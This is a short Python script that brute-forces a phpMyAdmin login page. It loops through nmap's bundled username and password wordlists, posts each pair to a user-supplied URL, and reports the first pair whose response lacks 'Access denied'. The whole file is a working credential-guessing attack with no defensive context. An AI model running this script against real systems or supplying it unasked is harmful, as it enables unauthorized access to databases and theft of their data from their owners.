import requests

url = input ("Insert the URL: ")
username_file = open('/usr/share/nmap/nselib/data/usernames.lst')
password_file = open('/usr/share/nmap/nselib/data/passwords.lst')

user_list = username_file.readlines()
pwd_list = password_file.readlines()

for user in user_list:
	user = user.rstrip()
	for pwd in pwd_list:
		pwd = pwd.rstrip()

		print (user, "-", pwd)
		data = {'pma_username': user, 'pma_password': pwd, 'Go': "Go"}
		send_data_url = requests.post(url, data = data)
		if not 'Access denied' in str(send_data_url.content):
			print ("Username e Password",user,pwd)
			exit()
